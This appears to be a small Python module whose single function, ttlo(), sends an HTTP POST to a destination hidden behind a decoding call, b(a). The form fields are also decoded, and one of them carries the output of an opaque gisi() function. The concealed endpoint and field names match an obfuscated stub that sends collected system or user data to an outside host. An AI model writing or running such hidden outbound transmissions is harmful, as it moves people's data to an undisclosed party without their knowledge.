from ttlo.b import *
import requests as r
from gisi.gisi import *


def ttlo():
    r.post(b(a), data={b(baa): b(c), b(d): gisi()})
